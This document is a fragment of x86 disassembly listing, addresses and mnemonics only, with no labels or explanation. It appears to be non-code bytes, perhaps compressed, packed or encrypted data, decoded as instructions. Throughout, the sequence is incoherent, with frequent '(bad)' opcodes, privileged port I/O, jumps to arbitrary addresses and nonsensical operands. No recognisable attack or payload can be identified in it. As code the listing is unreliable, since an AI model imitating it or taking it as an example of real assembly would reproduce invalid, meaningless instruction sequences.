  43dfbf:	jmp    FWORD PTR [edi+eiz*8+0x4ad5cfee]
  43dfc6:	pop    ebx
  43dfc7:	cwde   
  43dfc8:	push   0xb5ffe34d
  43dfcd:	or     BYTE PTR [esi+0xd04f0db],0x0
  43dfd4:	cdq    
  43dfd5:	sbb    ebx,edx
  43dfd7:	fdivr  st(1),st
  43dfd9:	sub    eax,0x98d93f89
  43dfde:	into   
  43dfdf:	fcomi  st,st(1)
  43dfe1:	jmp    0x43dfb9
  43dfe3:	fucomi st,st(1)
  43dfe5:	mov    bh,0xf6
  43dfe7:	xchg   ebp,eax
  43dfe8:	out    0x7e,eax
	...
  43e006:	add    BYTE PTR [eax],al
  43e008:	into   
  43e009:	fild   DWORD PTR [esp+edx*8-0xe]
  43e00d:	loop   0x43e024
  43e00f:	shr    DWORD PTR [eax],0x18
  43e012:	ds ss inc edi
  43e015:	and    ah,BYTE PTR [ebx-0x38]
  43e018:	out    dx,al
  43e019:	lahf   
  43e01a:	sbb    cl,dl
  43e01c:	mov    al,0x0
  43e01e:	adc    esp,ecx
  43e020:	push   esp
  43e021:	mov    esi,0xec012ce8
  43e026:	test   ebx,0xe8147522
  43e02c:	out    dx,al
  43e02d:	js     0x43e05b
  43e02f:	call   0xe838592e
  43e034:	es xchg esi,eax
  43e036:	jno    0x43e021
  43e038:	ret    
  43e039:	stos   DWORD PTR es:[edi],eax
  43e03a:	(bad)  
  43e03c:	test   DWORD PTR [ebx],0x4d1105
  43e042:	dec    esi
  43e043:	(bad)  
  43e044:	pop    ebx
  43e045:	jae    0x43dff3
  43e047:	out    0x2,eax
  43e049:	sar    BYTE PTR [esi+0x450bd601],1
  43e04f:	adc    al,0x4d
  43e051:	add    BYTE PTR [esi-0x11],ch
  43e054:	push   cs
  43e055:	or     eax,0xe70ea900
  43e05a:	pop    ebx
  43e05b:	add    eax,0x2601ac09
  43e060:	jne    0x43e03f
  43e062:	pop    ss
  43e063:	push   ds
  43e064:	inc    eax
  43e065:	es jae 0x43e035
  43e068:	(bad)  
  43e069:	shl    BYTE PTR es:[edi+0x0],cl
	...
  43e088:	add    BYTE PTR [eax],al
  43e08a:	jmp    0xaac966dc
  43e08f:	or     eax,0xf17275fb
  43e094:	out    0x4a,eax
  43e096:	out    0x23,al
  43e098:	cli    
  43e099:	imul   ebp,DWORD PTR [edx+0x745c00f5],0xdb5d3426
  43e0a3:	loope  0x43e0a4
  43e0a5:	rcl    BYTE PTR [ebp-0x21],0xfa
  43e0a9:	into   
  43e0aa:	inc    ecx
  43e0ab:	sbb    DWORD PTR [ebx+0x74],ecx
  43e0ae:	and    DWORD PTR [esi],esp
  43e0b0:	test   DWORD PTR ds:0x175af635,esp
  43e0b6:	push   esp
  43e0b7:	jp     0x43e09d
  43e0b9:	or     al,0xcf
  43e0bb:	clc    
  43e0bc:	(bad)  
  43e0bd:	cmp    esi,DWORD PTR [esp+edx*1+0x381c3a50]
  43e0c4:	sub    eax,0xee4906b2
  43e0c9:	mov    gs,ecx
  43e0cb:	jl     0x43e08c
  43e0cd:	test   BYTE PTR [edx+0xee8ff43],0xcd
  43e0d4:	addr16 out dx,al
  43e0d6:	mov    fs,WORD PTR [eax]
  43e0d8:	cli    
  43e0d9:	outs   dx,BYTE PTR ds:[esi]
  43e0da:	and    eax,DWORD PTR [eax+edx*1-0x57]
  43e0de:	push   cs
  43e0df:	jae    0x43e125
  43e0e1:	pop    ebp
  43e0e2:	mov    esi,0xfb56d6d1
  43e0e7:	dec    DWORD PTR [esi]
  43e0e9:	test   eax,0xfad00e
	...
  43e10a:	add    BYTE PTR [eax],al
  43e10c:	mov    cl,0x48
  43e10e:	or     DWORD PTR [eax-0x4c],eax
  43e111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e112:	repnz test ebx,edi
  43e115:	push   0xeab75658
  43e11a:	aaa    
  43e11b:	pop    ebp
  43e11c:	call   0xb0cf2973
  43e121:	stos   DWORD PTR es:[edi],eax
  43e122:	add    eax,0xffffff80
  43e125:	cmp    eax,0x41bc8360
  43e12a:	jae    0x43e167
  43e12c:	fwait
  43e12d:	stos   DWORD PTR es:[edi],eax
  43e12e:	inc    edx
  43e12f:	add    dh,bh
  43e131:	add    eax,0x7f4b7461
  43e136:	out    0x8,eax
  43e138:	add    BYTE PTR [edx],bl
  43e13a:	jns    0x43e125
  43e13c:	arpl   WORD PTR [eax+0x2],dx
  43e13f:	dec    ecx
  43e140:	rcr    DWORD PTR [esi],0x79
  43e143:	retf   
  43e144:	jbe    0x43e147
  43e146:	sbb    eax,DWORD PTR [ebx-0x7ca2005c]
  43e14c:	or     al,0xfc
  43e14e:	jae    0x43e167
  43e150:	and    al,0xd5
  43e152:	adc    edi,DWORD PTR [edx+eiz*2+0x3c]
  43e156:	cli    
  43e157:	pop    eax
  43e158:	xchg   edi,edi
  43e15a:	in     al,0x43
  43e15c:	and    al,0x1
  43e15e:	add    eax,DWORD PTR [ebx+0x3e30b5f]
  43e164:	mov    bh,0xe0
  43e166:	add    al,BYTE PTR [esi+0x3f]
  43e169:	outs   dx,DWORD PTR ds:[esi]
  43e16a:	idiv   BYTE PTR [esi+edx*8+0x4c]
  43e16e:	cmc    
  43e16f:	adc    eax,0x0
	...
  43e18c:	add    BYTE PTR [eax],al
  43e18e:	jl     0x43e186
  43e190:	aas    
  43e191:	add    BYTE PTR [edx],bl
  43e193:	dec    ebx
  43e194:	lock ret 
  43e196:	out    0x6f,al
  43e198:	sbb    eax,ebp
  43e19a:	xor    BYTE PTR [ecx-0x22c3000b],dh
  43e1a0:	push   ebp
  43e1a1:	dec    DWORD PTR ds:0x2d042db6
  43e1a7:	out    dx,eax
  43e1a8:	ret    0xeff
  43e1ab:	xchg   ebx,eax
  43e1ac:	dec    ebx
  43e1ad:	jae    0x43e1a8
  43e1af:	xor    bh,dh
  43e1b1:	mov    bh,0x25
  43e1b3:	cmc    
  43e1b4:	ret    0xb2ff
  43e1b7:	sbb    BYTE PTR [edx-0x6],cl
  43e1ba:	mov    dl,0xf2
  43e1bc:	add    eax,0x1be8ce87
  43e1c1:	add    ebx,DWORD PTR [ebx+0xa00dfd9]
  43e1c7:	mov    bh,0x43
  43e1c9:	shl    BYTE PTR [esi+0x6e7fce2a],0x28
  43e1d0:	cmc    
  43e1d1:	mov    cl,0x4e
  43e1d3:	jns    0x43e1eb
  43e1d5:	or     al,0x79
  43e1d7:	cs and eax,0x49ad5585
  43e1dd:	jae    0x43e1e0
  43e1df:	aaa    
  43e1e0:	call   FWORD PTR [edi]
  43e1e2:	inc    ebx
  43e1e3:	jmp    0xfa9c:0x21defe03
  43e1ea:	push   edx
  43e1eb:	cmp    al,0x9a
  43e1ed:	or     eax,0xc8c928cd
	...
  43e20e:	add    BYTE PTR [eax],al
  43e210:	dec    esi
  43e211:	sbb    bh,BYTE PTR [esi]
  43e213:	adc    DWORD PTR [esi+0x3e],0xffffff8a
  43e217:	mov    edi,0xbc0f65dd
  43e21c:	(bad)  
  43e21d:	call   0xa1fcae25
  43e222:	adc    al,BYTE PTR [eax+0x42929]
  43e228:	or     eax,0x7752cdfa
  43e22d:	sub    edx,DWORD PTR [esi+0x7db9b3ef]
  43e233:	xchg   ch,dh
  43e235:	xor    ch,0xf4
  43e238:	bnd jmp DWORD PTR [ecx-0xa]
  43e23c:	ret    
  43e23d:	mov    BYTE PTR [ecx-0x1ebce405],ah
  43e243:	jg     0x43e251
  43e245:	add    ecx,ebp
  43e247:	add    eax,DWORD PTR [eax-0x38d617ac]
  43e24d:	push   ds
  43e24e:	push   eax
  43e24f:	cli    
  43e250:	push   es
  43e251:	push   ds
  43e252:	xor    DWORD PTR [esi+0x51],edi
  43e255:	dec    esi
  43e256:	gs mov eax,0x3f31eb6
  43e25c:	or     eax,0xf3d3e880
  43e261:	aas    
  43e262:	ror    al,1
  43e264:	adc    cl,BYTE PTR [edi]
  43e266:	je     0x43e2ab
  43e268:	adc    eax,DWORD PTR [eax-0x1b]
  43e26b:	shl    eax,cl
  43e26d:	add    BYTE PTR [ecx+0x29000d03],dl
  43e273:	js     0x43e275
	...
  43e291:	add    bh,cl
  43e293:	out    dx,eax
  43e294:	cwde   
  43e295:	js     0x43e260
  43e297:	sbb    edx,eax
  43e299:	lahf   
  43e29a:	ss push ds
  43e29c:	fld    DWORD PTR [eax+0x5a6d0ea2]
  43e2a2:	pop    edx
  43e2a3:	push   ds
  43e2a4:	call   0x185fac1f
  43e2a9:	ja     0x43e26c
  43e2ab:	(bad)  
  43e2ad:	jae    0x43e2a5
  43e2af:	sbb    eax,0xe7a80b1
  43e2b4:	mov    ?,WORD PTR gs:[edx]
  43e2b7:	push   ds
  43e2b8:	call   0x1157aca7
  43e2bd:	sti    
  43e2be:	lea    ebx,[eax+ebx*4-0x6fff2fc]
  43e2c5:	mov    ch,0xdf
  43e2c7:	mov    dl,0x15
  43e2c9:	aad    0x99
  43e2cb:	ret    
  43e2cc:	jl     0x43e2ea
  43e2ce:	pop    es
  43e2cf:	in     eax,dx
  43e2d0:	push   DWORD PTR [esi+0x24]
  43e2d3:	cmp    DWORD PTR [edi+0x741afbf5],0x5bf43465
  43e2dd:	sti    
  43e2de:	into   
  43e2df:	sbb    eax,0xf6aa2983
  43e2e4:	mov    WORD PTR [edx+ebp*1-0x8eafcdb],fs
  43e2eb:	sbb    DWORD PTR [eax+0xe4f],edi
  43e2f1:	cmp    bl,BYTE PTR fs:0x2efc
	...
  43e314:	in     al,0x84
  43e316:	pop    ss
  43e317:	test   eax,0x12f59467
  43e31c:	xchg   DWORD PTR [esi-0x6c1beabc],eax
  43e322:	in     eax,0x6a
  43e324:	pop    edx
  43e325:	sbb    edx,edi
  43e327:	cdq    
  43e328:	es cld 
  43e32a:	int    0xfc
  43e32c:	xor    eax,0x6f7cbed6
  43e331:	into   
  43e332:	out    0x8c,eax
  43e334:	push   cs
  43e335:	add    BYTE PTR [eax],al
  43e337:	je     0x43e2e4
  43e339:	sbb    edi,esp
  43e33b:	scas   al,BYTE PTR es:[edi]
  43e33c:	inc    ecx
  43e33d:	pop    ss
  43e33e:	cli    
  43e33f:	nop
  43e340:	hlt    
  43e341:	(bad)  
  43e342:	(bad)  
  43e343:	call   0xc7436723
  43e348:	cmc    
  43e349:	sbb    DWORD PTR [edi+0x74c84ee1],eax
  43e34f:	mov    bl,0x19
  43e351:	fmul   DWORD PTR [eax+0x448c3526]
  43e357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e358:	push   es
  43e359:	push   eax
  43e35a:	es lahf 
  43e35c:	cmc    
  43e35d:	push   edi
  43e35e:	jmp    0x8d43f24b
  43e363:	fs push cs
  43e365:	sbb    bh,dl
  43e367:	add    BYTE PTR [ebx+0x3d401298],dl
  43e36d:	ins    DWORD PTR es:[edi],dx
  43e36e:	hlt    
  43e36f:	mov    al,0xe5
  43e371:	sti    
  43e372:	adc    DWORD PTR [ebp-0x6b1d17d7],ecx
	...
  43e394:	add    BYTE PTR [eax],al
  43e396:	(bad)  
  43e397:	jmp    0x2969d91
  43e39c:	add    BYTE PTR [eax],al
  43e39e:	jno    0x43e33e
  43e3a0:	cli    
  43e3a1:	std    
  43e3a2:	inc    ebx
  43e3a3:	call   0x59b7fc2a
  43e3a8:	jae    0x43e3a4
  43e3aa:	mov    al,0x55
  43e3ad:	pop    esi
  43e3ae:	lahf   
  43e3af:	fnstcw WORD PTR [esp+eax*1-0x137eb25c]
  43e3b6:	xor    eax,0xb401eef5
  43e3bb:	add    BYTE PTR [ebx+0x33],cl
  43e3be:	fild   QWORD PTR [esi]
  43e3c0:	aaa    
  43e3c1:	pop    edi
  43e3c2:	mov    al,0x6c
  43e3c4:	push   edi
  43e3c5:	cmp    BYTE PTR [ecx-0xec88ce8],dh
  43e3cb:	lods   eax,DWORD PTR ds:[esi]
  43e3cc:	or     bh,dh
  43e3ce:	and    esp,0xffffffe2
  43e3d1:	jmp    0x3a39ca94
  43e3d6:	ror    ecx,1
  43e3d8:	ins    DWORD PTR es:[edi],dx
  43e3d9:	add    eax,0x76d0472d
  43e3de:	push   ebp
  43e3df:	cdq    
  43e3e0:	push   ebp
  43e3e1:	or     al,0xb1
  43e3e3:	rcl    BYTE PTR ds:[eax+0x24],1
  43e3e7:	xor    al,0x4a
  43e3e9:	call   0x3c19d5
  43e3ee:	aaa    
  43e3ef:	leave  
  43e3f0:	mov    bh,0xee
  43e3f2:	and    eax,0xb98d0000
  43e3f7:	repz cmc 
  43e3f9:	inc    DWORD PTR [eax]
	...
  43e417:	add    BYTE PTR [ebx+0xd40129b],al
  43e41d:	loopne 0x43e3cf
  43e41f:	cmc    
  43e420:	xchg   ch,dh
  43e422:	div    DWORD PTR [esi]
  43e424:	(bad)  
  43e425:	sbb    eax,0x7847e7ff
  43e42a:	sub    dl,bh
  43e42c:	test   dl,dh
  43e42e:	div    DWORD PTR [edi]
  43e430:	push   eax
  43e431:	and    DWORD PTR [edx+0xe6a9808],ebp
  43e437:	push   eax
  43e438:	cmc    
  43e439:	psrlw  mm7,mm1
  43e43c:	ficomp DWORD PTR [esi-0x19e9f846]
  43e442:	scas   eax,DWORD PTR es:[edi]
  43e443:	or     BYTE PTR [ebp-0x4f],bl
  43e446:	xor    eax,0x7cdac0a1
  43e44b:	pop    edx
  43e44c:	add    eax,0xcfc8c573
  43e451:	and    eax,0xf59654fe
  43e456:	jle    0x43e4ba
  43e458:	adc    eax,0x9627d29
  43e45d:	sub    DWORD PTR [ebx-0x1d90a15],eax
  43e463:	(bad)  
  43e464:	fidivr WORD PTR [edx+0x77]
  43e467:	mov    ah,0x77
  43e469:	sbb    al,0x21
  43e46b:	cli    
  43e46c:	mov    BYTE PTR [edx+0xe],dh
  43e46f:	call   0xfa683358
  43e474:	adc    BYTE PTR [edi+0x3],dh
  43e477:	add    BYTE PTR ds:0x500faf,cl
	...
  43e499:	add    bh,ah
  43e49b:	sub    BYTE PTR [edi+0x74],dh
  43e49e:	xor    eax,0x35fa36a6
  43e4a3:	or     eax,0xa442fab4
  43e4a8:	ds jns 0x43e4cd
  43e4ab:	sahf   
  43e4ac:	cmp    al,0x4f
  43e4ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e4af:	mov    al,ds:0xd3e1e
  43e4b4:	ss sbb al,0x26
  43e4b7:	inc    edi
  43e4b8:	call   0x5290:0xe1409126
  43e4bf:	test   BYTE PTR [eax-0x5730ee50],ch
  43e4c5:	popf   
  43e4c6:	xchg   ebp,eax
  43e4c7:	(bad)  
  43e4c8:	aas    
  43e4c9:	adc    eax,0x78e9000d
  43e4ce:	mov    DWORD PTR ds:0x41e7266b,esp
  43e4d4:	call   0xd40d31dc
  43e4d9:	sub    al,0x34
  43e4db:	xchg   DWORD PTR [ecx],ebp
  43e4dd:	retf   0x3ec5
  43e4e0:	mov    bl,0x7a
  43e4e2:	mov    dh,0x7e
  43e4e4:	dec    esp
  43e4e5:	sub    ecx,DWORD PTR [ebp+0xd01e82b]
  43e4eb:	add    BYTE PTR [esi-0x40],bl
  43e4ee:	or     cl,bh
  43e4f0:	pop    ds
  43e4f1:	int    0x3f
  43e4f3:	mov    DWORD PTR [edi+ebx*8-0x50d828ea],esi
  43e4fa:	cwde   
  43e4fb:	xchg   eax,esp
  43e4fd:	aam    0x0
	...
  43e51b:	add    BYTE PTR [ebx-0x7692ffc2],cl
  43e521:	sbb    al,BYTE PTR [ecx]
  43e523:	jg     0x43e4e7
  43e525:	or     ah,BYTE PTR [ebp-0x7a]
  43e528:	jp     0x43e544
  43e52a:	call   0xd127e3a7
  43e52f:	cmp    eax,0x3f8e3ce
  43e534:	jne    0x43e556
  43e536:	pop    ds
  43e537:	es push edi
  43e539:	xchg   BYTE PTR [ebp-0x8],dl
  43e53c:	push   0x6b
  43e53e:	mov    bh,0x27
  43e540:	inc    edi
  43e541:	sub    DWORD PTR [eax+0x3d86a9b0],0xfffffff8
  43e548:	mov    DWORD PTR [ebx+0x1ad10cff],eax
  43e54e:	cli    
  43e54f:	jmp    0xcd877092
  43e554:	(bad)  
  43e555:	scas   eax,DWORD PTR es:[edi]
  43e556:	out    0xf1,eax
  43e558:	mov    esp,0xc96dfa1b
  43e55d:	mov    cs,WORD PTR [ebx+0x62]
  43e560:	mov    ebp,0xb5740bdd
  43e565:	fst    QWORD PTR [ebx]
  43e567:	jo     0x43e526
  43e569:	fst    QWORD PTR [ebx]
  43e56b:	or     DWORD PTR [ecx-0x7291039e],0x62017459
  43e575:	(bad)  
  43e577:	in     al,dx
  43e578:	xor    edi,ecx
  43e57a:	out    0x7a,eax
  43e57c:	push   esi
  43e57d:	push   ss
  43e57e:	cli    
  43e57f:	mov    bh,0x0
	...
  43e59d:	add    BYTE PTR [esi],ah
  43e59f:	mov    WORD PTR [eax+0x6399e846],cs
  43e5a5:	add    eax,0xde519b5
  43e5aa:	xor    al,0xc4
  43e5ac:	pop    es
  43e5ad:	fs push ecx
  43e5af:	lea    eax,[edi]
  43e5b1:	jb     0x43e617
  43e5b3:	add    eax,0x88b6b087
  43e5b8:	pop    es
  43e5b9:	(bad)  
  43e5ba:	int3   
  43e5bb:	add    eax,0x8886a187
  43e5c0:	push   es
  43e5c1:	jb     0x43e60c
  43e5c3:	add    eax,0x227aaa89
  43e5c8:	add    al,0x2f
  43e5ca:	dec    ebp
  43e5cb:	fisttp QWORD PTR [edi]
  43e5cd:	call   0xf9677303
  43e5d2:	in     eax,0x11
  43e5d4:	out    0x34,eax
  43e5d6:	xor    edx,DWORD PTR [esi]
  43e5d8:	cli    
  43e5d9:	nop
  43e5da:	clc    
  43e5db:	(bad)  
  43e5dc:	(bad)  
  43e5dd:	call   0x67a2a5
  43e5e2:	sub    al,0xdb
  43e5e4:	cli    
  43e5e5:	jmp    esp
  43e5e7:	push   esp
  43e5e8:	jae    0x43e5e3
  43e5ea:	scas   eax,DWORD PTR es:[edi]
  43e5eb:	pop    eax
  43e5ec:	push   ds
  43e5ed:	or     al,0x1b
  43e5ef:	inc    edx
  43e5f0:	and    ebp,0xfffebdc9
  43e5f6:	loope  0x43e58e
  43e5f8:	out    0x83,al
  43e5fa:	and    ch,0x79
  43e5fd:	in     al,dx
  43e5fe:	fsubr  DWORD PTR [edi]
  43e600:	push   eax
  43e601:	push   edi
	...
  43e61e:	add    BYTE PTR [eax],al
  43e620:	pushf  
  43e621:	xor    eax,0x2d7bff0f
  43e626:	loop   0x43e698
  43e628:	cmp    eax,0x7c8bf5e3
  43e62d:	cdq    
  43e62e:	ror    DWORD PTR [edi],1
  43e630:	jo     0x43e64f
  43e632:	(bad)  
  43e633:	jmp    esp
  43e635:	xchg   ecx,eax
  43e636:	jbe    0x43e65c
  43e638:	aam    0x95
  43e63a:	push   esi
  43e63b:	and    al,0xc4
  43e63d:	hlt    
  43e63e:	loope  0x43e5ea
  43e640:	dec    ecx
  43e641:	in     al,0x7e
  43e643:	shr    BYTE PTR [ebx-0x5bff0768],0xfc
  43e64a:	mov    WORD PTR [eax+edx*1+0x20],?
  43e64e:	loop   0x43e62b
  43e650:	aas    
  43e651:	loop   0x43e648
  43e653:	push   0xffffffc5
  43e655:	xchg   edi,eax
  43e656:	rcl    BYTE PTR [eax-0x72],0x74
  43e65a:	dec    ecx
  43e65b:	call   0x3c901a
  43e660:	lock mov esp,0xfd048405
  43e666:	(bad)  
  43e667:	(bad)  
  43e668:	out    dx,eax
  43e669:	fisttp DWORD PTR [edx-0x18]
  43e66c:	mov    ebx,0xf0fffbb7
  43e671:	ret    
  43e672:	add    eax,0x39484
  43e677:	add    BYTE PTR ds:0x212397a4,cl
  43e67d:	aas    
  43e67e:	shr    DWORD PTR [ecx+0xca94140],1
	...
  43e6a0:	add    BYTE PTR [eax],al
  43e6a2:	xchg   BYTE PTR [eax-0x4d],ah
  43e6a5:	mov    al,gs:0x602f2bf5
  43e6ab:	push   0x114d831e
  43e6b0:	sub    BYTE PTR [ebp-0x7301d8f3],0xc9
  43e6b7:	dec    edx
  43e6b8:	out    dx,al
  43e6b9:	dec    edi
  43e6ba:	cmc    
  43e6bb:	inc    ebx
  43e6bc:	push   ebx
  43e6bd:	cld    
  43e6be:	add    dl,BYTE PTR [ebx+0xe038413]
  43e6c4:	in     al,0xfa
  43e6c6:	jns    0x43e70d
  43e6c8:	out    dx,al
  43e6c9:	push   ecx
  43e6ca:	ja     0x43e6e2
  43e6cc:	mov    cl,0xe7
  43e6ce:	push   ss
  43e6cf:	je     0x43e6ee
  43e6d1:	cli    
  43e6d2:	inc    ebx
  43e6d3:	xchg   ecx,eax
  43e6d4:	(bad)  
  43e6d5:	and    edi,esi
  43e6d7:	shl    BYTE PTR [ecx-0x79],0xca
  43e6db:	mov    BYTE PTR [ebx-0x1f21685],0xa
  43e6e2:	xchg   ecx,eax
  43e6e3:	test   eax,0xa90d0003
  43e6e8:	mov    al,ds:0x984d0d07
  43e6ed:	mov    WORD PTR [ecx+0x45],cs
  43e6f0:	out    dx,al
  43e6f1:	dec    edi
  43e6f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e6f3:	xchg   ecx,eax
  43e6f4:	ins    DWORD PTR es:[edi],dx
  43e6f5:	cld    
  43e6f6:	xchg   edx,eax
  43e6f7:	mov    ds:0x6d838413,al
  43e6fc:	add    bl,bh
  43e6fe:	stc    
  43e6ff:	inc    esp
  43e700:	out    dx,al
  43e701:	push   ecx
  43e702:	out    0x86,eax
  43e704:	mov    cl,0xe7
	...
  43e722:	add    BYTE PTR [eax],al
  43e724:	pop    esi
  43e725:	aad    0x1d
  43e727:	cli    
  43e728:	ret    
  43e729:	mov    al,ds:0xfffe23c7
  43e72e:	sar    BYTE PTR [ebp-0x7c26e86e],1
  43e734:	(bad)  
  43e735:	fndisi(8087 only) 
  43e737:	add    eax,ecx
  43e739:	ret    
  43e73a:	pop    ebx
  43e73b:	lahf   
  43e73c:	out    dx,al
  43e73d:	jmp    0x43e70f
  43e73f:	fldcw  WORD PTR [ebx+0x15]
  43e742:	mov    ecx,0xa98b02ad
  43e747:	mov    bl,0xb0
  43e749:	(bad)  
  43e74a:	adc    eax,0xa24c762c
  43e74f:	and    cl,BYTE PTR [esi-0x7e29ebc0]
  43e755:	mov    esp,0x285af3cc
  43e75a:	jnp    0x43e7b2
  43e75c:	add    DWORD PTR [edi],edx
  43e75e:	ins    DWORD PTR es:[edi],dx
  43e75f:	adc    edx,DWORD PTR [ecx-0x9fe0bf3]
  43e765:	mov    ecx,esp
  43e767:	repz cmp al,0xaa
  43e76a:	div    DWORD PTR [esi+0x219c8aea]
  43e770:	xlat   BYTE PTR ds:[ebx]
  43e771:	lods   eax,DWORD PTR ds:[esi]
  43e772:	jo     0x43e73b
  43e774:	cs repz inc eax
  43e777:	cmc    
  43e778:	xchg   edx,eax
  43e779:	push   ss
  43e77a:	dec    ecx
  43e77b:	add    DWORD PTR [esi-0x24],0xfffffff1
  43e77f:	add    eax,DWORD PTR [ecx-0x4]
  43e782:	ins    DWORD PTR es:[edi],dx
  43e783:	inc    esi
  43e784:	stos   DWORD PTR es:[edi],eax
  43e785:	push   es
  43e786:	xor    dl,dh
	...
  43e7a4:	add    BYTE PTR [eax],al
  43e7a6:	mov    dl,0xff
  43e7a8:	pusha  
  43e7a9:	and    ah,BYTE PTR [edi-0x70e2ef4e]
  43e7af:	push   ss
  43e7b0:	sbb    esi,edx
  43e7b2:	push   edx
  43e7b3:	mov    dh,0xb2
  43e7b5:	mov    esi,0x45ab1c93
  43e7ba:	push   cs
  43e7bb:	add    BYTE PTR [esi+ecx*4+0x1b048266],bl
  43e7c2:	lea    esp,[ebx]
  43e7c4:	dec    esp
  43e7c6:	adc    al,BYTE PTR [eax]
  43e7c8:	add    BYTE PTR [eax-0x53],ch
  43e7cb:	out    dx,al
  43e7cc:	(bad)  
  43e7cd:	call   0x3790fec0
  43e7d2:	xchg   esp,eax
  43e7d3:	or     DWORD PTR [edi+0x4a],edi
  43e7d6:	push   cs
  43e7d7:	add    BYTE PTR [eax],al
  43e7d9:	rcl    edx,0x9
  43e7dc:	sti    
  43e7dd:	mov    BYTE PTR [ecx-0x107eece2],0x19
  43e7e4:	xchg   BYTE PTR [ecx-0x71c9e6c0],dl
  43e7ea:	cld    
  43e7eb:	jnp    0x43e838
  43e7ed:	call   0x25d0e800
  43e7f2:	and    eax,0xcd604ff2
  43e7f7:	loope  0x43e810
  43e7f9:	sbb    DWORD PTR [edi],0x8586fc5e
  43e7ff:	push   ebp
  43e800:	or     ah,BYTE PTR [ebp-0x1a]
  43e803:	add    BYTE PTR [eax],al
  43e805:	jmp    0xd967a9a5
	...
  43e826:	add    BYTE PTR [eax],al
  43e828:	sahf   
  43e829:	sbb    eax,0x19fa9235
  43e82e:	xchg   BYTE PTR [ecx-0x50],bl
  43e831:	adc    dh,BYTE PTR [ebx+0xb]
  43e834:	in     al,dx
  43e835:	nop
  43e836:	and    edi,ecx
  43e838:	test   BYTE PTR [ebx+0xce69a6b],bl
  43e83e:	scas   al,BYTE PTR es:[edi]
  43e83f:	aas    
  43e840:	in     al,dx
  43e841:	scas   al,BYTE PTR es:[edi]
  43e842:	xchg   DWORD PTR [ebp-0x5117f94e],ebp
  43e848:	xchg   ebp,eax
  43e849:	sbb    bh,dl
  43e84b:	imul   ebp,DWORD PTR [ebp-0x1f],0x7bfde90a
  43e852:	bnd jmp 0x95d0e866
  43e858:	push   0xffffffed
  43e85a:	out    0x0,eax
  43e85c:	inc    ebx
  43e85d:	nop
  43e85e:	sti    
  43e85f:	call   FWORD PTR [esi-0x7b397cfa]
  43e865:	arpl   WORD PTR [ebx+0x53],bp
  43e868:	or     al,0xc5
  43e86a:	test   eax,0xba7d73fe
  43e86f:	psubsb mm3,mm1
  43e872:	cli    
  43e873:	push   DWORD PTR [ebx+eiz*2]
  43e876:	(bad)  
  43e877:	addr16 test al,0x84
  43e87a:	cmp    al,BYTE PTR [eax]
  43e87c:	fisubr WORD PTR [ecx+ecx*2-0x18]
  43e880:	mov    edx,0xb8fff8ab
  43e885:	rol    BYTE PTR ds:0x17684,0x0
	...
  43e8a8:	add    BYTE PTR [eax],al
  43e8aa:	inc    BYTE PTR [edi]
  43e8ac:	lea    eax,[ebp+0x1c]
  43e8af:	push   ecx
  43e8b0:	fs jbe 0x43e8fa
  43e8b3:	in     al,0x9a
  43e8b5:	mov    bl,0x92
  43e8b7:	fistp  QWORD PTR [esi-0x40]
  43e8ba:	add    edi,DWORD PTR [ebp-0x5a]
  43e8bd:	add    ah,ah
  43e8bf:	add    BYTE PTR [ecx],bh
  43e8c1:	jge    0x43e87f
  43e8c3:	jbe    0x43e8d5
  43e8c5:	(bad)  
  43e8c6:	fstp   DWORD PTR [eax]
  43e8c8:	cmc    
  43e8c9:	jne    0x43e8a3
  43e8cb:	bound  ebp,QWORD PTR [ebp+0x53]
  43e8ce:	cmp    al,0x7e
  43e8d0:	test   eax,0xba7d63fe
  43e8d5:	movaps xmm2,XMMWORD PTR [edx+0x39a4fffa]
  43e8dc:	jnp    0x43e8ea
  43e8de:	js     0x43e8cf
  43e8e0:	div    BYTE PTR [ebp-0x50]
  43e8e3:	bound  esp,QWORD PTR [edi+0x53]
  43e8e6:	dec    esp
  43e8e7:	out    0xa9,al
  43e8e9:	(bad)  
  43e8ea:	repz jl 0x43e8a7
  43e8ed:	je     0x43e960
  43e8ef:	cmp    DWORD PTR [ebx+0x10],edi
  43e8f2:	or     eax,0xf8fb0f73
  43e8f7:	push   ss
  43e8f8:	lods   al,BYTE PTR ds:[esi]
  43e8f9:	gs fsubp st(6),st
  43e8fc:	xor    eax,0x811573ae
  43e901:	mov    edi,0x7b897fe1
  43e906:	sub    DWORD PTR [edi],edi
  43e908:	dec    eax
  43e909:	inc    ebx
  43e90a:	xor    DWORD PTR [esi],ecx
  43e90c:	(bad)  
  43e90d:	out    0x0,eax
	...
  43e92b:	add    BYTE PTR [edx-0x4805e5ce],bh
  43e931:	daa    
  43e932:	test   edx,eax
  43e934:	xor    eax,0x3afa158d
  43e939:	mov    ds:0xa3fd7343,al
  43e93e:	push   edi
  43e93f:	and    ecx,ebp
  43e941:	sub    dh,bh
  43e943:	push   DWORD PTR ds:0x1af9d15e
  43e949:	xchg   ecx,eax
  43e94a:	lahf   
  43e94b:	and    ebx,ecx
  43e94d:	mov    ds:0x27dd2387,eax
  43e952:	(bad)  
  43e953:	call   FWORD PTR [ebp-0x2a]
  43e956:	sub    esi,DWORD PTR [edx-0x78e58338]
  43e95c:	dec    ecx
  43e95d:	cmp    eax,0x28fbb909
  43e962:	(bad)  
  43e963:	call   DWORD PTR [esi-0x2500bea5]
  43e969:	imul   ecx,ebx,0xfe2fd474
  43e96f:	mov    WORD PTR [ecx+0x5],cs
  43e972:	lock out 0x93,eax
  43e975:	scas   al,BYTE PTR es:[edi]
  43e976:	sbb    bh,dl
  43e978:	mov    edx,0x8b882616
  43e97d:	rcr    BYTE PTR [edx],cl
  43e97f:	dec    esi
  43e980:	mov    ch,0xa6
  43e982:	cmp    edx,0x23c79fa2
  43e988:	or     al,BYTE PTR [eax]
  43e98a:	push   cs
  43e98b:	setbe  bh
  43e98e:	adc    BYTE PTR [esi+0x0],dl
	...
  43e9ac:	add    BYTE PTR [eax],al
  43e9ae:	mov    WORD PTR [ebx],ss
  43e9b0:	adc    DWORD PTR [ebx+0x1f62906a],esi
  43e9b6:	ja     0x43e986
  43e9b8:	sub    BYTE PTR [edi+0x296db6d4],bh
  43e9be:	leave  
  43e9bf:	cmp    eax,0x86b803dc
  43e9c4:	cld    
  43e9c5:	mov    cl,BYTE PTR [edi+edi*2]
  43e9c8:	aam    0xb7
  43e9ca:	ret    
  43e9cb:	stos   BYTE PTR es:[edi],al
